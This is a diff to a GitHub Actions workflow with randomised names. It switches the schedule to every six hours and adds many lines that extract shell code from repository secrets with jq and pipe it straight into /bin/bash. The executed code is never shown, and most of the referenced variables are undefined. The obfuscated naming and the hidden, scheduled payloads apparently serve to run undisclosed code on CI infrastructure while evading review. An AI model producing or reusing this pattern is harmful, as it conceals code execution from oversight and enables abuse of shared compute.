@@ -3,7 +3,7 @@ name: xingtianyuan4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 0/6 * * *'
+    - cron: '55 1/6 * * *'
 
 jobs:
   build:
@@ -12,10 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: xingtianyuan4567
         env:
-          aazqu462: ${{ secrets.aazqu462 }}
+          xzho96490: ${{ secrets.xzho96490 }}
         run: |
-          echo $aazqu462 | jq -r .wjr6054 | /bin/bash
-          echo $jpa5 | jq -r .cqarj0954 | /bin/bash
-          echo $vanjv04141 | jq -r .v0 | /bin/bash
-          echo $admbr53504 | jq -r .v887 | /bin/bash
+          echo $xzho96490 | jq -r .oyyb640 | /bin/bash
+          echo $lrzds61145 | jq -r .l22 | /bin/bash
+          echo $g86 | jq -r .a994 | /bin/bash
+          echo $urvf72267 | jq -r .kudi60 | /bin/bash
+          echo $l7285 | jq -r .lwyzd9690 | /bin/bash
+          echo $bms5341 | jq -r .etix04698 | /bin/bash
+          echo $qhkbs66 | jq -r .ycrx6081 | /bin/bash
+          echo $g44599 | jq -r .y51 | /bin/bash
+          echo $mvuql9150 | jq -r .avpsb4 | /bin/bash
+          echo $uhiz9339 | jq -r .gek235 | /bin/bash
+          echo $nk1367 | jq -r .b68 | /bin/bash
+          echo $g8562 | jq -r .uynd59624 | /bin/bash
+          echo $vtrax20 | jq -r .j03 | /bin/bash
+          echo $m281 | jq -r .e32 | /bin/bash
+          echo $rmndw02973 | jq -r .tua320 | /bin/bash
 
